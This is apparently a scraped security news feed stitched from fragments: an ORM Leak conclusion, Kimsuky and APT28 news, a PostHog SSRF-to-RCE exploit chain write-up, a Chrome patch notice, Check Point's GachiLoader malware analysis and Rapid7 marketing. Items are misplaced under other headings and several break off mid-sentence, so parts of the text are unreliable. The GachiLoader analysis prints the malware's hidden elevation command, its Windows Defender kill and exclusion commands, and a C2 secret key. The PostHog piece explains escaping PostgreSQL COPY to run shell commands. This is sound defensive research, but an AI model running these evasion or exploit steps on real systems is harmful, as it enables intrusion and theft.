because the  SQL condition in  is case-insensitive. In contrast, the  operator preserves case sensitivity.Another complication is that byte ordering in the database may not align with raw byte values due to collation rules, which are primarily designed to support different languages and character sets with varying sort orders. For example, using the default SQL_Latin1_General_CP1_CI_AS collation in MSSQL, sorting a string produces results that are not ordered by byte value (as shown below). This directly affects logical operator based ORM Leak attacks, which rely on predictable ordering.String of characters that were sorted by ascending byte order using  encoding. !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~

It is important to note that these  rules are not fully robust, due to limitations in  itself and the inherent challenges of detecting vulnerable input parsing into ORMs.semgrep  /rules/python/audit/orm-leak/django-orm.yaml /app/label-studio/
The most effective approach we have found for identifying ORM Leak vulnerabilities is a hybrid of dynamic and static analysis: first identifying search and filtering functionality within an application dynamically, and then tracing the source code to uncover flaws in the query logic.This will likely be our final article on the ORM Leak vulnerability class, unless we uncover a new exploitation technique targeting ORMs.We want to emphasise that ORM Leak vulnerabilities do not depend on the use of susceptible ORMs such as Django or Prisma. Instead, this issue is widespread across modern web applications due to the growing demand for robust filtering capabilities. Developers often rely on the underlying ORM to provide sufficient validation, overlooking the fact that certain fields should never be queryable.While SQL injection was once one of the most prevalent vulnerability classes, it is now relatively rare due to improved security awareness, training, and tooling. In contrast, we increasingly encounter applications that unintentionally allow users to search sensitive fields or control both the field and operator used in queries. As demonstrated throughout this series, these patterns can lead to significant data exposure.We look forward to seeing further research into ORM Leak vulnerabilities and, of course, more cinematic proof-of-concept demonstrations of sensitive data being exfiltrated.]]></content:encoded></item><item><title>Positive trends related to public IP ranges from the year 2025, (Thu, Dec 18th)</title><link>https://isc.sans.edu/diary/rss/32584</link><author></author><category>threatintel</category><pubDate>Thu, 18 Dec 2025 08:07:56 +0000</pubDate><source url="https://isc.sans.edu/">SANS Internet Storm Center, InfoCON: green</source><content:encoded><![CDATA[Since the end of the year is quickly approaching, it is undoubtedly a good time to look back at what the past twelve months have brought to us… And given that the entire cyber security profession is about protecting various systems from “bad things” (and we’ve all correspondingly seen more than our share of the “bad”), I thought that it might be pleasant to look at a few positive background trends that have accompanied us throughout the year, without us necessarily noticing…]]></content:encoded></item><item><title>Kimsuky Spreads DocSwap Android Malware via QR Phishing Posing as Delivery App</title><link>https://thehackernews.com/2025/12/kimsuky-spreads-docswap-android-malware.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjXfvLiKFsryuDZrfr2qiAYePwlVAsyejJM2t1Z_kDfiC3UESmR-QuVtIsdDQxuak0MBFgJg6k5RVzWmR5nBCJ3RSuqfCB1XgWie0qQow6mg3DhBx5E5sjd9zWtfPc5FnXt4omgsICqKhlMl5Lr-mbvKj-KDQhSR6g0Xho1Myzphu9uWYYJujfZRUxTMYMU/s1600/android-qr-code.jpg" length="" type=""/><pubDate>Thu, 18 Dec 2025 07:43:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[The North Korean threat actor known as Kimsuky has been linked to a new campaign that distributes a new variant of Android malware called DocSwap via QR codes hosted on phishing sites mimicking Seoul-based logistics firm CJ Logistics (formerly CJ Korea Express).

Our team was internally discussing moving to a different platform analytics solution. Our team was really leaning more towards Posthog. It’s one of the brilliant -I personally believe it’s the best- products on the market. And that’s where the story has begun…We have a somewhat unconventional—some might say —approach to vendor selection. Before we seriously consider adopting a product, we give ourselves a strict 24-hour “research window.” Not a marketing review. Not a feature comparison spreadsheet. A hands-on, source-level, deep dive into how the product actually behaves once it’s running in our environment.Earlier this year, the process was no different.PostHog came up as a strong candidate. It was open source, widely adopted, and promised exactly what we were looking for: self-hosted product analytics with a modern architecture and a fast time-to-value. Spinning it up was trivial. With a single command and a few containers, we had a fully functional instance running locally within minutes.Act 1 – Installation and Understanding the High-Level ArchitectureInstallation was relatively trivial. I just followed the https://posthog.com/docs/self-host documentation and did some tweaks. Understanding the architecture at a high level was always a good starting point for developing attack scenarios later. I mean, literally a few weeks later, your brain will remember these tiny bits of information when you stumble upon a problem and desperately try to find a solution! Therefore, please always spend more time on Act-1 on your own research projects.The following diagram shows an over-simplified version of the PostHog architecture. But it’s enough to understand what’s going on behind the scenesBefore ending this section, I would like to add this. There are workers and plug-in services written with the Rust language, which are not shown in the above diagram. Imagine that this “Celery” box is actually divided into different workers and plug-ins. This will be important later.Act 2 – Multiple Server-Side Request ForgeryPostHog officially supports thousands of external integrations, allowing teams to pull data from CRMs, support platforms, billing systems, and internal tools. The promise is compelling:Analyze product and customer data in PostHog – no matter where it was generated.From a product perspective, this makes perfect sense. From a security perspective, it is all about SSRF. Therefore I immidiately started to looking for SSRF vulnerabilities by reading source code for main application, as well as workers and plug-ins and I ended-up finding following SSRF vulnerabilities.CVE-2024-9710 | PostHog Rust Webhook Handler Server-Side Request Forgery Information Disclosure VulnerabilityCVE-2025-1522 | PostHog database_schema Server-Side Request Forgery Information Disclosure VulnerabilityCVE-2025-1521 | PostHog slack_incoming_webhook Server-Side Request Forgery Information Disclosure VulnerabilityI will just focus on only one case in this write-up. At the end of the day it won’t matter which SSRF is gonna be used for the RCE chain.“Bypass” of  | Analysis of PostHog Rust Webhook Handler Server-Side Request ForgeryYou can configure Posthog to send HTTP POST requests to the URL based on the defined actions.More information about webhook can be found at https://posthog.com/docs/webhooks :The following screenshot shows how to add a webhook endpoint to the project. When you try to add localhost, it is going to be rejected.The Following request is being send to the  endpoint. As you can see in the response, localhost is not allowed to be added as a webhook endpoint.I received {"error":"invalid webhook URL"} which is an error I was expecting. A quick search on the code base has shown where the validation takes place.Detailed analysis of this  has shown that actually  was found by Github Security CodeQL team and fixed by the vendor.The SSRF validation on this code flow is actually pretty good and solid. But this endpoint just performs validation on the URL. The question is:Which endpoint actually saves the URL ?When/where is this endpoint used during a webhook call?(BONUS: If you go ahead and read the raise_if_user_provided_url_unsafe function, you will see that validation can be bypassed with simple TOCTOU approach. Give it a try on your local if you havent heard TOCTOU vulnerabilities <3)To answer these questions, I started with a valid domain name.When the frontend receives a  response from the  endpoint, it assumes the URL is safe and proceeds to save the configuration. However, while the test endpoint applied SSRF validations, the save endpoint did not enforce the same checks.By bypassing the frontend and sending a direct  request to the project API, it was possible to store a webhook URL pointing to  or other internal addresses. This created a persistent SSRF primitive, as the webhook worker would later issue server-side requests to these internal destinations. Triggering the Action: Rust Webhook WorkerTo trigger the webhook delivery, I created a new action under Data Management → Actions → New Action, selecting “From event or pageview.” Using a simple regex that matches all events ensured the action would fire for virtually any browser activity.Once the action was saved, no further setup was required. Any incoming event matching the regex would automatically trigger the Rust-based webhook worker, which then issued a server-side request to the webhook URL configured earlier. Now you can either use your own browser to send event data or, you can use  SDK. Following simple requests will send an event to PostHog, which will trigger all the steps I’ve mentioned above.We all know it’s quite important to know what type of SSRF we have in terms of exploitation capabilities. At this point, I dived into how to trigger the SSRF and better understand our lovely SSRF primitive.Rust Webhook Worker – Understading our SSRF  Primitive  method from rust/hook-worker/src/worker.rs is the one who is sending these outgoing HTTP webhook requests.When a Rust worker processes the job, it sends a request to the configured webhook URL without re-validating the destination. As a result, any previously saved internal URL is trusted and used directly, introducing an SSRF condition.Additionally, the worker follows HTTP redirects. This allows an incoming  request to be redirected into a  request targeting an internal HTTP service by responding with a  redirect to the desired internal endpoint. This is the most important information I needed to know. Later down the road, you will see that we actually need an HTTP GET request for our RCE chain.Act 3 – Clickhouse SQL injection in postgresql and sqlite table functions 0-dayPostHog is explicit about its architecture: “ClickHouse is our main analytics backend”. Every event, every action, and every query ultimately flows through ClickHouse.Once a reliable SSRF primitive existed, this made ClickHouse the most natural internal service to target. By default, ClickHouse exposes an  on . This interface is enabled out of the box and, in common self-hosted deployments, does not require authentication or API tokens. The API allows queries to be issued directly over HTTP.By design, HTTP  requests to the query endpoint are treated as read-only. Any operation that modifies data is expected to be performed via an HTTP  request with a specific request body. This distinction initially suggests a strong safety boundary.Clickhouse Table FunctionsOne of the interesting features of the Clickhouse is called Table Functions, which can be used in the  clause of a  statement. These functions create temporary, query-scoped tables that exist only for the duration of the query.One such function is , which allows ClickHouse to read from—or write to—a remote PostgreSQL database. Let’s say we have the following table in PostgreSQL:We can reach this postgresql server and fetch the data from the test table by using Clickhouse Table function as follows:When I was reading the documentation, conceptually, the flow looks safe:ClickHouse parses the query (above one taken from user via HTTP API)It generates its own internal PostgreSQL queryThat query is executed remotely, typically via a COPY (SELECT …) TO STDOUT statementBut at the same time, more questions are raised on my mind. How do they actually make sure that transaction is READ only ? Because that’s what they say in their documentation. All the GET requests to the Clickhouse API can do operation with a READ ONLY mode. Second question was more important: How does the user-controlled input provided in a ClickHouse query end up escaping sanitization and being injected when ClickHouse internally builds the PostgreSQL query executed on the remote PostgreSQL database?Here is the internally built PostgreSQL query to be executed on the remote db.Wrong PostgreSQL escaping leading to Remote PostgreSQL Injection VulnerabilityEscaping is tricky stuff. Especially the PostgreSQL universe; it can even get more complicated.When I’ve seen the table name that I’ve provided is used on the final PostgreSQL query, I started to thinking about, “What if they made a mistake on the escaping here and I can actually inject my own query into the final Postgresql query???”I have added one single quote to the end of the username. Hit the ENTER and looked for the Postgresql console to see incoming query. And BOOM! They actually try to escape single quote with a back-slash, which is just a string for Postgresql universe. That small bug on the Clickhouse actually doesn’t expose a seriouse vulnerability for Clickhouse itself. But in this context, it can actually help us to achieve a RCE.Escalating SQL Injection to the Remote Code ExecutionAs described in the ClickHouse documentation, the HTTP API is designed to be read-only for all operations performed via HTTP GET requests. But we can literally inject our own query into the postgresql table function, which allows us to execute any query on the database we want!  But we must do a few more tricks to actually execute any query we want.This time let’s have a look at my final payload first and then break it down. Sending the following query is enough to have a reverse shell from the PostgreSQL instance.Lets reformat it to better understand (Thanks for the feedbacok Simon Willison)Here is the how does it work:We first escape from the COPY operation by using  and close it with We reached out to the Clickhouse HTTP API with GET request, thus our COPY operation actually have READ ONLY transaction on PostgreSQL, thus we need to call  Otherwise we can NOT execute our own query 🙂And then by using PostgreSQL’s FROM PROGRAM feature, we can easily run any operating system command we want.The most important trick here is actually usage of  instead of  within the payload section. These dollar signs () are used for . It can be used to replace single quotes enclosing string literals (constants) anywhere in SQL scripts. If I have used  again for our own query, it would have been “escaped” by Clickhouse by using black-slash, which will cause a syntax error on the PostgreSQL side!Act 4 – Chaining them all togetherEach issue on its own appeared low to moderate impact. But once you chained them together, we have the following attack chain:1 – Forgotten webhook URL validation on save method.2 – No SSRF protection on internal worker written with Rust.3 – Exploiting SSRF to convert the POST request to a GET request4 – Clickhouse postgresql escaping mistake leads to SQL Injection.5 – Breaking out of COPY transaction and executing our own COPY FROM PROGRAM payload.6 – Forming a special payload that satisfies both Clickhouse and Postgresql by using dollar quoting.7 – Clickhouse internal docker name and Postgresql credentials are static.Here is the diagram version of the attack chain.And the exploit in action.

That makes it a massive target. When Chrome has a security flaw that can be triggered just by visiting a website, billions of users are exposed until they update.That’s why it’s important to install these patches promptly. Staying unpatched means you could be at risk just by browsing the web. Attackers often try to exploit browser vulnerabilities quickly, before most users have a chance to update. Always let Chrome update itself, and don’t delay restarting it, as updates usually fix exactly this kind of risk.The latest version number is  for Windows and macOS, and  for Linux. So, if your Chrome is on version  it’s protected from these vulnerabilities.The easiest way to update is to allow Chrome to update automatically, but you can end up lagging behind if you never close your browser or if something goes wrong—such as an extension stopping you from updating the browser.To update manually, click the  menu (three dots), then go to  > . If an update is available, Chrome will start downloading it. Restart Chrome to complete the update, and you’ll be protected against these vulnerabilities.One of the vulnerabilities was found in the WebGPU web graphics API, which allows for graphics processing, games, and more, as well as AI and machine learning applications. This vulnerability, tracked as CVE-2025-14765 is a use-after-free vulnerability that could allow a remote attacker to potentially exploit heap corruption via a crafted HTML page.Use-after-free is a class of vulnerability caused by incorrect use of dynamic memory during a program’s operation. If, after freeing a memory location, a program does not clear the pointer to that memory, an attacker may be able to use the error to manipulate the program.Heap corruption occurs when a program inadvertently damages the allocator’s view of the heap, which can lead to unexpected alterations in memory. The heap is a region of memory used for dynamic memory allocation.The other vulnerability, known as CVE-2025-14766 was—once again—found in the V8 engine as an out-of-bounds read and write.V8 is the engine that Google developed for processing JavaScript, and it has seen more than its fair share of bugs.An out-of-bounds read and write vulnerability means an attacker may be able to manipulate parts of the device’s memory that should be out of their reach. Such a flaw allows a program to read or write outside the bounds the program sets, enabling attackers to manipulate other parts of the memory allocated to more critical functions. Attackers could write code to a part of the memory where the system executes it with permissions that the program and user should not have.In this case, the vulnerability could be exploited when the engine processes specially crafted HTML content, such as a malicious website.We don’t just report on threats—we remove them]]></content:encoded></item><item><title>APT28 Targets Ukrainian UKR-net Users in Long-Running Credential Phishing Campaign</title><link>https://thehackernews.com/2025/12/apt28-targets-ukrainian-ukr-net-users.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgQLzd6YnWyQ56Xbt_HlhI75xek4Jz48-N00eU2I6DGqA6KBmlo-vE932Zz6ASRHE9KetD1kl8j4_5BoGhhYRNWFFyamUMFWugIxQ9YIAx1ZLsXqqqYz7-tiAcSIAz1H5mmzZtqnCRlSB4aksTWjZ_jWIVBp9F4J60tOrVZyKBr1DHILd5o7y8DLmINuWHO/s1600/action.jpg" length="" type=""/><pubDate>Wed, 17 Dec 2025 15:30:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[The Russian state-sponsored threat actor known as APT28 has been attributed to what has been described as a "sustained" credential-harvesting campaign targeting users of UKR[.]net, a webmail and news service popular in Ukraine.

## Key Points

- The YouTube Ghost Network is a malware distribution network that uses compromised accounts to promote malicious videos and spread malware, such as infostealers.
- One of the observed campaigns uses a new, heavily obfuscated loader malware written in Node.js, which we call _GachiLoader_.
- To make it easier to analyze obfuscated Node.js malware, Check Point Research developed an open-source Node.js tracer, which significantly reduces the effort needed to analyze this type of malware and extract configurations.
- One variant of _GachiLoader_ deploys a second stage malware, _Kidkadi_, that implements a novel technique for Portable Executable (PE) injection. This technique loads a legitimate DLL and abuses Vectored Exception Handling to replace it on-the-fly with a malicious payload.

## Introduction

In a previous publication, we examined the YouTube Ghost Network, a coordinated collection of compromised accounts that abuse the platform to promote malware. In our current research, we analyze one specific campaign of this network, which stood out as the deployed malware implements a previously undocumented PE injection method which abuses Vectored Exception Handling to load its malicious payload.

## Campaign Overview

Similar to campaigns we previously documented, the infection chain begins with compromised accounts that host videos designed to lure viewers into downloading malware from an external file hosting platform. The theme of this campaign are game cheats and various cracked software:

The video’s descriptions then provide a password for the archive containing the malware, as well as instructions that usually include disabling Windows Defender.

We identified **more than a hundred videos** belonging to this campaign, which collected approximately **220.000 views**. The videos were spread across **39 compromised accounts**, with the **first video uploaded on December 22, 2024**. This means that this campaign has been running for more than 9 months. After we reported these videos to YouTube, most have been taken offline, although new videos will continue to appear on newly compromised accounts.

Since we started monitoring this specific campaign, it deployed the Rhadamanthys infostealer as a final payload, which is distributed through a custom loader which we call _GachiLoader_.

## GachiLoader

_GachiLoader_ is a heavily obfuscated Node.js JavaScript malware used to deploy additional payloads to an infected machine. Node.js is one of a long line of threat actors always adapt their arsenal using non-traditional programming languages and platforms adapted by threat actors in their quest to spread malware.

As obfuscated JavaScript requires a lot of time and effort to manually deobfuscate, we developed a **tracer for Node.js scripts** to dynamically analyze this type of malware, defeat common anti-analysis tricks and significantly reduce the manual analysis effort. This tool is not only useful for _GachiLoader_, but is useful for anyone analyzing heavily obfuscated Node.js malware. Therefore, we decided to share it with the research community here:

Some of the analyzed _GachiLoader_ samples drop a second-stage loader, which we call _Kidkadi._ This loader is particularly interesting, as it implements a **novel technique for PE injection**, which tricks the Windows loader into loading a malicious PE from memory instead of a legitimate DLL. We analyzed this technique, which we call **Vectored Overloading** and reimplemented it in a Proof-of-Concept (PoC) shared below.

### Technical Analysis

_GachiLoader_’s JavaScript module is bundled into a self-contained executable, using the `nexe` packer, with sizes roughly between 60 and 90 MB. `nexe` is an open-source project, that compiles a Node.js application into a single executable file, bundled with a Node.js runtime, so that the file can run on a host without Node.js installed. While the size of the executable is quite big, it isn’t suspicious as the victim expects to receive a software package. The tool nexe\_unpacker can be used to extract the obfuscated JavaScript source code from the PE.

### Anti-Analysis Features

To avoid analysis by a security researcher or an automated sandbox, the _GachiLoader_ JavaScript module employs several anti-VM and anti-analysis checks:

- Checks if the total amount of RAM is at least 4GB
- Checks if at least 2 CPU cores are available
- Compares the username against a list of usernames, that can be associated with various sandboxes or analysis systems (see Appendix A for a list of all names).
- Checks the hostname against a similar list of hostnames (see Appendix B for a list of all hostnames).
- Probes the running programs and compares against a list of programs, such as analysis tools, sandbox indicators or common programs running on VMs (see Appendix C for a list of all process names).

The malware then proceeds to run several PowerShell commands to enumerate the system resources and capabilities over `WMI` .

- Check if at least one port connector object exists: `(Get-WmiObject Win32_PortConnector).Count`
- Get drive manufacturers and compare against a blacklist: `Get-WmiObject Win32_DiskDrive | Select-Object -ExpandProperty Model` (See Appendix D for a list of all drive manufacturers).
- Resolve video controllers via `Get-WmiObject Win32_VideoController | Select-Object -ExpandProperty Name`, and check the names against a blacklist associated with VM environments (See Appendix E for a list of all video controller names).

If any of these checks indicate a virtual machine, sandbox or analysis environment the malware enters a loop of sending `HTTP GET` requests to benign websites such as `linkedin.com`, `grok.com`, `whatsapp.com` or `twitter.com` :

Finally, to avoid running multiple times in a short period of time, a mutex file with a random-per-sample name and the `.lock` extension is created in the `%TEMP%` directory on running for the first time. If this file already exists or was modified within the last 5 minutes, the program terminates.

We were able to easily bypass all of these anti-analysis with Node.js Tracer: the tool hooks into the respective methods and spoofs the results to the caller, in this case the malware, allowing the script to run and expose its malicious actions:

### Privilege Elevation via UAC Prompt

If the malware decides that the environment is not that a sandbox, it then checks if it is running in an elevated context by running `net session` , a command that is expected to fail if run by a non-administrative user. If the command fails, the malware tries to restart itself in an elevated context using the following PowerShell command:

`powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c \"]]></content:encoded></item><item><title>GachiLoader: Defeating Node.js Malware with API Tracing</title><link>https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/</link><author>samanthar@checkpoint.com</author><category>threatintel</category><pubDate>Wed, 17 Dec 2025 14:11:50 +0000</pubDate><source url="https://research.checkpoint.com/">Check Point Research</source><content:encoded><![CDATA[The YouTube Ghost Network is a malware distribution network that uses compromised accounts to promote malicious videos and spread malware, such as infostealers.One of the observed campaigns uses a new, heavily obfuscated loader malware written in Node.js, which we call .To make it easier to analyze obfuscated Node.js malware, Check Point Research developed an open-source Node.js tracer, which significantly reduces the effort needed to analyze this type of malware and extract configurations.One variant of  deploys a second stage malware, , that implements a novel technique for Portable Executable (PE) injection.

While the size of the executable is quite big, it isn’t suspicious as the victim expects to receive a software package. The tool nexe_unpacker can be used to extract the obfuscated JavaScript source code from the PE.To avoid analysis by a security researcher or an automated sandbox, the  JavaScript module employs several anti-VM and anti-analysis checks:Checks if the total amount of RAM is at least 4GBChecks if at least 2 CPU cores are availableCompares the username against a list of usernames, that can be associated with various sandboxes or analysis systems (see Appendix A for a list of all names).Checks the hostname against a similar list of hostnames (see Appendix B for a list of all hostnames).Probes the running programs and compares against a list of programs, such as analysis tools, sandbox indicators or common programs running on VMs (see Appendix C for a list of all process names).The malware then proceeds to run several PowerShell commands to enumerate the system resources and capabilities over  .Check if at least one port connector object exists: (Get-WmiObject Win32_PortConnector).CountGet drive manufacturers and compare against a blacklist: Get-WmiObject Win32_DiskDrive | Select-Object -ExpandProperty Model (See Appendix D for a list of all drive manufacturers).Resolve video controllers via Get-WmiObject Win32_VideoController | Select-Object -ExpandProperty Name, and check the names against a blacklist associated with VM environments (See Appendix E for a list of all video controller names).If any of these checks indicate a virtual machine, sandbox or analysis environment the malware enters a loop of sending  requests to benign websites such as , ,  or  :Finally, to avoid running multiple times in a short period of time, a mutex file with a random-per-sample name and the  extension is created in the  directory on running for the first time. If this file already exists or was modified within the last 5 minutes, the program terminates.We were able to easily bypass all of these anti-analysis with Node.js Tracer: the tool hooks into the respective methods and spoofs the results to the caller, in this case the malware, allowing the script to run and expose its malicious actions:Privilege Elevation via UAC PromptIf the malware decides that the environment is not that a sandbox, it then checks if it is running in an elevated context by running  , a command that is expected to fail if run by a non-administrative user. If the command fails, the malware tries to restart itself in an elevated context using the following PowerShell command:powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c \"<path_to_program_itself>\"'"While this triggers a UAC prompt, that prompt is likely to be accepted by the victim, as they expect to run an installer for some sort of software, which usually requires administrative privileges.To avoid detections of subsequent payloads, the malware attempts to kill Windows Defender’s  process by running taskkill /F /IM SecHealthUI.exe and adds Defender exclusions via Add-MpPreference -ExclusionPath for the following paths:For all other existing drives, at the root (e.g.  )In addition, an exclusion for  files is added via Add-MpPreference -ExclusionExtension '.sys', although we have not observed any  files being dropped by the analyzed samples.Payload Delivery and ExecutionTo retrieve the next stage’s payload, the malware comes in two variants.One variant gets the payload from a remote URLThe other variant drops another loader, , which loads the final payload using the Vectored Overloading method. This payload is embedded in the loader’s JavaScript source.First Variant – Remote Payload first obtains information about the host it is running on, such as antivirus products and the OS version, and sends them via a  request to the  endpoint of its C2 (Command and Control) addresses. The samples all have multiple C2 addresses embedded for redundancy and try out each one in succession, as we saw when tracing the calls through our tracer:Next, a  request to the  endpoint (where  is a value unique to each sample) with the  header gets the URL of the final payload to download, encoded in Base64. This final payload can only be retrieved if using the correct  header again – this time using a unique key embedded in the binary, e.g. X-Secret: 5FZQY1gYj0UKw4ZC99d1oNYR8LvTPtrfN357Eh5gmRvsMaPYgXtMxRXpMb2bTFOb2h2HqMnvUKT9CUpj9864gckmPUzf9uLIIU9. Otherwise, the web server returns a  error.The final payload is then downloaded to the  directory and saved with a random name, mimicking legitimate software such as ,  ,  or others which contain the Rhadamanthys infostealer, packed and protected with VMProtect or Themida.The second variant we observed in the wild did not reach out to a C2 server to get the second payload, but instead had an embedded payload which is executed through another loader that is dropped to disk under  as : files are native addons for Node.js, which are essentially just DLLs that can be called from Node.js code via . Therefore, they can be used by developers whenever the Node-API does not expose sufficient functionality.The malware exposes a function for Node.js to call, where the name of the method differs across samples. In some cases, the name as well as the error messages in some samples are of Russian origin:The loader passes the payload PE as a binary buffer to  through this exposed function, which then runs this payload via reflective PE loading. We found that this loader uses a novel spin on Module Overloading, abusing Vectored Exception Handlers (VEHs) to trick the Windows operating system to run the final payload, when invoking  to load an arbitrary DLL. This technique, not yet documented, shows that the author has a decent understanding of Windows internals. We named this method .PE Loading via Vectored OverloadingThe malware first creates a new section with  from the legitimate , a DLL used by Windows Media Player. It then overwrites this section with the content of the payload (the PE to be loaded) and maps a view of that section into the process via . The PE’s sections are then copied into memory one by one and relocations as well as the correct protections are applied:This results in a view of the malicious PE, mapped to the process, which is backed by the legitimate DLL . This section view is what the Windows loader (meaning ) will be tricked into loading later on.Since the Windows loader, called via , does not load arbitrary PEs, but only those that have DLL characteristics, the  of the  are set to  , if the payload is not a DLL. Additionally, the entry point is zeroed out, likely to avoid the loader calling an entry point that is not that of a DLL. If the payload is a DLL, the header is not changed.Afterwards, the malware registers a Vectored Exception Handler (VEH).VEHs are user-mode callbacks that are invoked by the OS when an exception occurs. A common malware technique abusing VEHs is to register a hardware breakpoint on a specific instruction, which triggers an exception whenever this instruction is reached. This exception is then handled by the VEH, which can intercept the call and, for example, change the parameters. This essentially allows hooking functions without patching memory, such as when using classic trampoline hooks.In this case, the hardware breakpoint (HWBP) is set on  :The malware then loads  via  , which kicks off the injection:A call to  internally ends up in the Windows loader creating a section object of the target DLL to load, which is opened through a call to  . This triggers the hardware breakpoint, and subsequently the VEH, which were registered earlier. This is where the main injection logic is implemented.To make the loader map the malicious PE instead of the actual  section, the section object pointing to  is swapped with the malicious payload section from earlier. The VEH simply places the section handle created earlier on the stack position that corresponds to the [out] PHANDLE SectionHandle argument of . The VEH then advances the instruction pointer  to the  instruction and resumes execution. This skips the actual call to the kernel while still giving back a valid handle, essentially emulating:Before stepping out of the VEH, the hardware breakpoint is re-set to  is then used by the Windows loader to map the section into the process, which again triggers the hardware breakpoint. To make sure the malicious payload is mapped, the syscall is again emulated by advancing the instruction pointer and replacing the  arguments with the relevant values, such as the section base address or the section size. This is possible, because the section view was mapped by the malware earlier, when the malicious payload was written into the view of :A final hardware breakpoint is then set on  , where the malware simply verifies that the correct section handle is closed.Back in the regular flow of the program, outside the VEH, the entry point will be invoked if the payload is a regular PE. If it is a DLL, the loader expects it to be another  module and resolves the correct exports to invoke:Completely unrelated to this campaign, we found a file with an original filename of , which is a 64-bit PoC version of the technique with debug prints that uses the technique to load  into memory. Error strings in this binary indicate that the loader uses code from libpeconv for PE manipulation.This injection technique has multiple advantages over “classic” RunPE-style reflective loading:Just like when using the Module Overloading technique, the injected DLL will show up as backed by a legitimate image (such as ), since the section was originally created for this DLL. However, since the code in memory will differ from the code on disk, tools such as Moneta are able to detect it:Some loader work is offloaded to the Windows loader. This significantly reduces complexity for the malware author as they do not have to implement e.g. resolving imports or TLS callbacks, which in turn increases payload compatibility. For example, many publicly available PE loaders do not properly handle TLS callbacks.By emulating syscalls, the respective kernel side callbacks such as ETWti are not invoked, as the call to the kernel is skipped entirely. This may fool security solutions that rely only on these section ETWti events. Of course, the earlier calls before the injection (when mapping the image) still trigger those events, but not in the order usually expected.We published a reimplementation of the 64bit variant of this injection method as a tool for security researchers to analyze the technique and test detections:As deobfuscation of the JavaScript source is a tedious and partially manual process, we decided to run all available samples of  through Node.js Tracer to bypass the anti-analysis checks and receive the final payloads. By hooking filesystem-related Node APIs, the downloaded files are saved for the analyst before they can be deleted by the malware trying to remove its traces.The final payloads of both variants of  were all packed and protected by Themida or VMProtect. Dumping the unprotected configuration from memory when running them in an automated sandbox then allowed us to extract the C2 servers of the final payloads.All the analyzed samples that were part of this campaign dropped Rhadamanthys as the final malware. The extracted C2 servers can be found in the IoC section below.Malware written for the Node.js platform has become increasingly common and is mostly found in obfuscated form, which is tedious to statically deobfuscate and analyze. By enabling analysts to trace and hook Node-API execution dynamically with our open source Node.js Tracer, the time that has to be spent on triage and analysis is significantly reduced, and common anti-analysis checks can easily be defeated.The threat actor behind  demonstrated proficiency with Windows internals, coming up with a new variation of a known technique. This highlights the need for security researchers to stay up-to-date with malware techniques such as PE injections and to proactively look for new ways in which malware authors try to evade detections.The threat actors behind the YouTube Ghost Network exploit the trust in the YouTube platform to trick victims into downloading malware. Users should be particularly cautious of offers for cracked software, cracks, trainers, or cheats, as these files are frequently laced with malware designed to steal data and/or compromise a device. While both the security community and YouTube actively work to identify and remove such content, these attacks remain persistent.Check Point Threat Emulation and Harmony Endpoint provide comprehensive

New domains are registered, acquisitions bring inherited infrastructure, cloud workloads spin up and down daily, and somewhere in the middle of it all, your visible footprint on the internet external attack surface keeps expanding.For CISOs, this constant motion makes one CTEM step particularly difficult: . You can’t validate what you can’t see and manual inventory updates can’t keep up with the pace of digital change.That’s why Rapid7 is introducing dynamic EASM discovery for Surface Command, a new capability that automatically identifies and tracks every part of your external attack surface. By continuously ingesting known domain and IP information from your environment and related management tools, Surface Command ensures your visibility is always accurate, always current, and always ready for validation.From static inventories to continuous confidenceTraditional External Attack Surface Management (EASM) tools rely on static “seed lists”, known IPs, domains, or networks used to start discovery scans. But as organizations evolve, those seeds quickly become stale, leaving blind spots that attackers can exploit.Dynamic EASM discovery replaces static inputs with live intelligence. Surface Command, Rapid7’s attack surface management (ASM) solution, now automatically gathers seed data from across your ecosystem, including DNS records, network services, and asset repositories and feeds it directly into the Rapid7 Command Platform. Asset, vulnerability, automation, control, threat, and enrichment data are ingested into our Command Platform through Connectors.The result: a continuously updated, validated view of your internet-facing footprint.No spreadsheets. No manual uploads. No surprises.Why this matters for CTEM step 2: DiscoveryContinuous threat exposure management (CTEM) is the discipline of constantly discovering, prioritizing, validating, and mobilizing against risk. Most organizations excel at discovery and prioritization but validation often lags behind.Discovery is where confidence becomes measurable:Did the exposure we fixed actually disappear?Is our attack surface shrinking or just shifting?Are we making progress we can prove?Dynamic EASM discovery strengthens , discovery by ensuring your exposure data reflects the real, live environment. Every time a cloud resource changes or a new asset appears, Surface Command automatically revalidates what’s known versus what’s newly exposed.That means your CTEM cycle is never out of sync with reality, and your reports to leadership reflect verified reductions in risk, not assumptions.Connecting visibility to outcomesDynamic EASM discovery doesn’t just simplify inventory management, it accelerates progress across the CTEM lifecycle:: Continuously ingesting data expands your external visibility.: Integrated context links assets to business impact and threat intelligence.: Continuous seed refresh confirms exposures are resolved and risk is reducing.: Validated insights flow into ITSM and automation workflows for closure.For security leaders, this translates to clear, measurable progress: a smaller attack surface, shorter exposure windows, and data that executives can trust.An attacker’s view you can trustExternal visibility is only useful if it’s reliable. With  Surface Command provides a real-time, attacker’s-eye view of your organization’s public-facing assets, domains, subdomains, IPs, and network services; all validated against live data.This level of automation gives CISOs three distinct advantages: - Automatically capture new and transient assets the moment they appear.- Validate that remediation efforts have actually closed exposures. - Operate on verified intelligence instead of lagging asset data.Validation becomes continuous, evidence-based, and defensible.Executive clarity through proofBoards don’t want more alerts, they want proof that investments in security are paying off. Dynamic EASM Discovery helps CISOs demonstrate that progress with concrete, validated metrics: tracked over timepercentages by business unit measured in real, verified outcomesWhen the question comes, “are we actually reducing risk?” Surface Command gives you evidence, not estimates.Simplified operations, stronger securityDynamic EASM discovery is built into Rapid7’s Command Platform, eliminating the manual effort that once slowed exposure management. Security and IT teams can focus on reducing risk instead of reconciling data sources, while automation keeps inventories and dashboards perpetually up to date.Reduced administrative overheadElimination of stale or duplicate 